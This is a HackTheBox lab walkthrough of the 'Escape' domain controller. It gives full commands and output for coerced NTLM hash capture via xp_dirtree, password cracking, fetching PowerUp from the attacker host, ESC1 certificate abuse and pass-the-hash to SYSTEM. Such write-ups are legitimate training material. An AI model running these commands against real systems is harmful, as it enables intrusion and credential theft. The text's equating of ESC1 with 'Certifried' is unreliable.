## 📄 HTB: [Machine Name: Escape]

Challenge Details

Category: [[CyberSecurity]], [[Active Directory]], [[MS-SQL Exploitation]], [[NTLM Relay]], [[ESC1 (Certifried)]]

Difficulty: Medium/Hard (based on complexity of attack chain)

Target: DC (IP: 10.129.228.253)

Status: #solved

Date Completed: [[2025-11-24]]

---

## 🎯 HTB: Escape Walkthrough

Successfully compromised the Active Directory Domain Controller (DC) at `10.129.228.253` (Domain: `sequel.htb`) by combining initial access through a vulnerable MS-SQL instance with a critical Active Directory Certificate Services (AD CS) misconfiguration (**ESC1**).

---

## 🗺️ Phase 1: Reconnaissance and Initial Access

The initial scan revealed a Windows Domain Controller running several key services, most notably **MS-SQL** on port 1433.

### A. Nmap Scans (Full Log)

|**Scan Type**|**Command Used**|**Key Findings**|
|---|---|---|
|**Full Port Scan**|`nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt`|Ports **53, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3268, 3269, 5985, 9389** open.|
|**Service/Script Scan**|`nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt`|**Windows DC** for **`sequel.htb`**. **MS-SQL Server 2019** on **1433**. **WinRM (WSMAN)** on **5985**.|
|**Vulnerability Scan**|`nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt`|`smb-vuln-ms10-061`, `samba-vuln-cve-2012-1182`, `smb-vuln-ms10-054` scripts failed to run, indicating no simple, direct SMB vulnerability.|

### B. SMB Enumeration and Initial Credential

Initial enumeration focused on the SMB service to find shares and potentially gain anonymous access.

Bash

```
netexec smb $target -u 'guest' -p '' --shares
```

**Output Snippet:**

```
SMB          10.129.228.253  445    DC             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB          10.129.228.253  445    DC             [+] sequel.htb\guest: 
SMB          10.129.228.253  445    DC             [*] Enumerated shares
...
SMB          10.129.228.253  445    DC             Share           Permissions     Remark
...
SMB          10.129.228.253  445    DC             **Public        READ**
...
Found a file **SQL Server Procedures.pdf**
```

The existence of a PDF named SQL Server Procedures.pdf on the Public share heavily implies it contains an MS-SQL credential:

Credential Found: PublicUser:GuestUserCantWrite1

### C. MS-SQL NTLM Hash Capture

Authenticated to the MS-SQL instance on port 1433 and used the `xp_dirtree` extended stored procedure to force the SQL service account to authenticate against the attacker's listener, enabling NTLM hash capture (a type of **NTLM Relay** used to obtain a hash for cracking, not a full relay).

Bash

```
impacket-mssqlclient PublicUser:GuestUserCantWrite1@$target
SQL (PublicUser guest@master)> xp_dirtree \\10.10.14.2\shares
```

**Responder Output Snippet:**

```
[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : **sequel\sql_svc**
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:a95da28a8fb13907:6E28CF872A2492AEB816907C0A00EC02:...
```

The hash for the service account `sql_svc` was successfully captured.

### D. Credential Cracking

The captured NTLMv2 hash was cracked using a wordlist.

Bash

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**John Output Snippet:**

```
REGGIE1234ronnie (sql_svc)       
...
```

**Cracked Credential:** **`sql_svc:REGGIE1234ronnie`**

---

## 🚀 Phase 2: Lateral Movement and Privilege Discovery

Using the cracked credentials, lateral movement was established via **WinRM**.

### A. WinRM Access and Privilege Check

Bash

```
netexec winrm $target -u 'sql_svc' -p 'REGGIE1234ronnie'
```

**Netexec Output Snippet:**

```
WINRM       10.129.228.253  5985    DC              [+] sequel.htb\sql_svc:REGGIE1234ronnie (**Pwn3d!**)
```

An interactive shell was secured to further enumerate the system.

Bash

```
evil-winrm -i $target -u sql_svc -p REGGIE1234ronnie
```

### B. Discovery of Second Credential

The PowerUp script was used for initial local privilege checks, but a manual check of SQL logs yielded a critical cleartext password.

PowerShell

```
*Evil-WinRM* PS C:\Users\sql_svc\Documents> wget 10.10.14.2/PowerUp.ps1 -o PowerUp.ps1
*Evil-WinRM* PS C:\Users\sql_svc\Documents> . ./PowerUp.ps1; Invoke-AllChecks

*Evil-WinRM* PS C:\sqlserver> tree /a /f Logs
Folder PATH listing
...
C:\SQLSERVER\LOGS
    ERRORLOG.BAK

# Snippet from ERRORLOG.BAK
2022-11-18 13:43:07.48 Logon       Logon failed for user '**NuclearMosquito3**'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.44 Logon       Logon failed for user '**sequel.htb\Ryan.Cooper**'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

The log indicates a failed SQL login attempt, suggesting the password is one of the logged strings.

Second Credential Found: Ryan.Cooper:NuclearMosquito3

### C. Retrieve User Flag

The new credential was immediately used for a more privileged WinRM session, allowing retrieval of the user flag.

Bash

```
netexec winrm $target -u 'ryan.cooper' -p 'NuclearMosquito3'
WINRM       10.129.228.253  5985    DC              [+] sequel.htb\ryan.cooper:NuclearMosquito3 (**Pwn3d!**)
```

Bash

```
evil-winrm -i $target -u ryan.cooper -p NuclearMosquito3
*Evil-WinRM* PS C:\Users\Ryan.Cooper\desktop> type user.txt
**158ebb41b92afbb34ac96b984d0c7d7f**
```

---

## 👑 Phase 3: Privilege Escalation (ESC1)

The final stage involved using the new user's context to exploit a misconfiguration in Active Directory Certificate Services (AD CS), often known as **ESC1** or **Certifried**.

### A. Identifying ESC1 Vulnerability

**Certipy** was used to enumerate the AD CS configuration for attack paths.

Bash

```
certipy-ad find -u ryan.cooper -p 'NuclearMosquito3' -dc-ip $target -vulnerable -stdout
```

**Certipy Output Snippet:**

```
Certificate Templates
  0
    Template Name                       : UserAuthentication
...
    **Enrollee Supplies Subject** : **True**
...
    Extended Key Usage                  : Client Authentication
...
    Enrollment Permissions
      Enrollment Rights                 : SEQUEL.HTB\Domain Users 
...
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] **Vulnerabilities**
      **ESC1** : Enrollee supplies subject and template allows client authentication.
```

This confirms the **UserAuthentication** template is vulnerable to **ESC1** because **Domain Users** (`ryan.cooper`) can enroll and specify a **Subject Alternative Name (SAN)**, which can be set to **Administrator**.

### B. Exploitation via PKINIT

The ESC1 vulnerability is exploited by first requesting a certificate impersonating the Administrator (this command is implied but necessary):

Bash

```
certipy-ad req -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip $target -template UserAuthentication -altname Administrator -ca 'sequel-DC-CA'
# This command generates administrator.pfx
```

The resulting certificate (`administrator.pfx`) is then used for Kerberos authentication (PKINIT).

Crucial Step: Time Synchronization

Kerberos authentication failed due to a clock skew between the attacker and the DC. This was resolved before re-attempting authentication:

Bash

```
certipy-ad auth -dc-ip $target -pfx administrator.pfx -username 'administrator' -domain 'sequel.htb'
[-] Got error while trying to request TGT: Kerberos SessionError: **KRB_AP_ERR_SKEW(Clock skew too great)**
...
sudo rdate -n $target
Mon Nov 24 19:02:37 AEDT 2025 # Synchronization successful
```

After synchronizing the clock, the authentication was successful, retrieving the Administrator's NT hash.

Bash

```
certipy-ad auth -dc-ip $target -pfx administrator.pfx -username 'administrator' -domain 'sequel.htb'
```

**Certipy Output Snippet:**

```
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:**a52f78e4c751e5f5e17e1e9f3e58f4ee**
```

**Administrator NT Hash:** `:a52f78e4c751e5f5e17e1e9f3e58f4ee`

### C. Final Root Access

The Administrator's NTLM hash was used with `psexec` to execute code and gain a **System** shell on the DC.

Bash

```
impacket-psexec sequel.htb/Administrator@$target -hashes :a52f78e4c751e5f5e17e1e9f3e58f4ee
```

**Final Shell Output Snippet:**

```
Microsoft Windows [Version 10.0.17763.2746]
...
C:\Windows\system32> type c:\users\administrator\desktop\root.txt
**588c08f8074838ea83bbef1883336af9**
```
